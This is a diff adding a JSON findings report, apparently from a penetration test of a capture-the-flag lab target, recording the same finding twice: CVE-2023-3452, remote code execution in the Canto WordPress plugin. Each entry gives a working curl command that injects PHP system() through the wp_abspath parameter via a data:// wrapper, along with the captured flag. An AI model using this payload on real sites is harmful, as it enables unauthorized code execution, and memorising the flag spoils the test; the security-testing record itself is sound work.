@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:14:50.380040+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "3a9f0b6a-ef8a-4014-b36d-b44f66b3e355",
+      "timestamp": "2026-04-14T15:14:50.379937+00:00",
+      "title": "CVE-2023-3452: Canto WordPress Plugin RFI/RCE",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53243",
+      "description": "The Canto WordPress plugin (version 3.0.4) is vulnerable to Remote File Inclusion (RFI) via the 'wp_abspath' parameter in multiple PHP files including download.php. This allows unauthenticated attackers to include and execute arbitrary remote code on the server when allow_url_include is enabled in PHP configuration. The vulnerability was exploited using a data:// PHP wrapper to execute system commands.",
+      "evidence": "flag{24796716-6e4f-4db6-adcb-2bc42d4c0fb3}",
+      "tool_used": "curl/manual",
+      "cve": "CVE-2023-3452",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s \"http://172.17.0.1:53243/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=data://text/plain,<?php%20system('cat%20/FLAG.txt');?>\"",
+        "expected": "flag{24796716-6e4f-4db6-adcb-2bc42d4c0fb3}"
+      }
+    },
+    {
+      "id": "c9974c75-9ce0-48a9-8750-dc89eeb65336",
+      "timestamp": "2026-04-14T15:14:50.478445+00:00",
+      "title": "CVE-2023-3452: Canto WordPress Plugin RFI/RCE",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53243",
+      "description": "The Canto WordPress plugin (version 3.0.4) is vulnerable to Remote File Inclusion (RFI) via the 'wp_abspath' parameter in multiple PHP files including download.php. This allows unauthenticated attackers to include and execute arbitrary remote code on the server when allow_url_include is enabled in PHP configuration. The vulnerability was exploited using a data:// PHP wrapper to execute system commands.",
+      "evidence": "flag{24796716-6e4f-4db6-adcb-2bc42d4c0fb3}",
+      "tool_used": "curl/manual",
+      "cve": "CVE-2023-3452",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s \"http://172.17.0.1:53243/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=data://text/plain,<?php%20system('cat%20/FLAG.txt');?>\"",
+        "expected": "flag{24796716-6e4f-4db6-adcb-2bc42d4c0fb3}"
+      }
+    }
+  ],
+  "diagrams": []
+}
